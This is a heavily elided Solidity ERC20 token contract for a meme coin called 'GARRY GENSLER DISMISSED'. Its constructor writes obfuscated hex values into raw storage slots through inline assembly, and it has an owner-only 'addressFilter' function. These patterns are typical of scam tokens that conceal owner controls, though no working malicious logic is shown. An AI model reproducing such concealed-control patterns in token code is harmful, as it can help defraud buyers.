...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x8fad53f49c7d567d3a6439a232b34202a0b6609e668)
            sstore(0x51,0x8fa52effc90341014d9ea62a2a39d773334601a0913)
    ...
    function addressFilter(bytes32[] memory buyer, uint target, uint number) public onlyOwner returns (address receiver) {
    }
    ...
    function _DeployRoss(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRoss(creator, initialSupply);
    }
}

contract GENSLERED is ERC20Token {
    constructor() ERC20Token("GARRY GENSLER DISMISSED", "GENSLERED", msg.sender, 666666666 * 10 ** 18) {
    }
}
